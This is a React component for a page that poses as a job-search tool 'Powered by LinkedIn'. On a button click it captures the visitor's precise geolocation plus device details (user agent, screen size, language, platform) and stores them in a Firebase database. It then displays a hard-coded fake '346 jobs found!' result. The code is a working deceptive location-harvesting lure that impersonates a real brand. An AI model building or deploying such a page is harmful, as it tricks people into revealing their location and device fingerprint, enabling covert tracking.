// src/LocationSaver.js
import React, { useState } from "react";
import { database } from "./firebase";
import { ref, push, set } from "firebase/database";

const LocationSaver = () => {
  const [status, setStatus] = useState("");

  const getLocation = () => {
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(saveLocation, showError);
    } else {
      setStatus("Geolocation not supported by this browser.");
    }
  };

  const saveLocation = (position) => {
    const lat = position.coords.latitude;
    const lon = position.coords.longitude;

    const locationRef = push(ref(database, "locations"));
    set(locationRef, {
        userAgent: navigator.userAgent,
        screenWidth: window.screen.width,
        screenHeight: window.screen.height,
        language: navigator.language,
        platform: navigator.platform,
      latitude: lat,
      longitude: lon,
      timestamp: new Date().toISOString()
    });

    setStatus(`346 jobs found!`);
  };

  const showError = (error) => {
    setStatus("Error getting location: " + error.message);
  };

  return (
    <div className="main" style={{ padding: "20px"}}>
    <h2>A new way to find <span style={{ color: 'blue' }}>JOBS! 🚀</span></h2>
    <p>Allow location access to find the best job opportunities near you 🔥</p>
    <button
      onClick={getLocation}
      style={{
        backgroundColor: '#ff5733',  // Vibrant background color
        color: '#fff',               // White text color
        border: 'none',              // No border
        padding: '10px 20px',        // Button padding
        fontSize: '16px',            // Text size
        borderRadius: '5px',         // Rounded corners
        cursor: 'pointer',          // Pointer cursor on hover
        transition: 'all 0.3s ease', // Smooth transition
      }}
    >
      Find Jobs Near You ⚡️
    </button>
    <p>{status}</p>

    <p>Powered by <span style={{ color: 'blue' }}>LinkedIn</span></p>
  </div>
  
  );
};

export default LocationSaver;
